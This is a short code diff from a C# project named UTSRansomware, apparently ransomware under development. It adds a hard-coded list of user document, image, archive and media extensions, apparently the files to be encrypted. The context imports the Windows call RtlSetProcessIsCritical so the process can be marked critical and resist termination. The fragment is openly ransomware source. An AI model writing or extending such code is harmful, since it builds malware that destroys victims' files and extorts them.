@@ -11,6 +11,19 @@ namespace UTSRansomware
 {
     public static class Utils
     {
+
+        // Common file extensions
+        public static string[] fileExtensions = {
+        ".doc", ".docx", // Microsoft Word
+        ".xls", ".xlsx", // Microsoft Excel
+        ".ppt", ".pptx", // Microsoft PowerPoint
+        ".pdf",          // Adobe PDF
+        ".jpg", ".jpeg", ".png", ".gif", ".bmp", // Images
+        ".txt", ".rtf",  // Text File
+        ".zip", ".7z", ".rar", // Archives
+        ".mp3", ".mp4", ".avi", ".mkv", // Video + Audio    
+        };
+
         // Allows marking process as critical to Windows OS
         [DllImport("ntdll.dll", SetLastError = true)]
         private static extern void RtlSetProcessIsCritical(UInt32 v1, UInt32 v2, UInt32 v3);
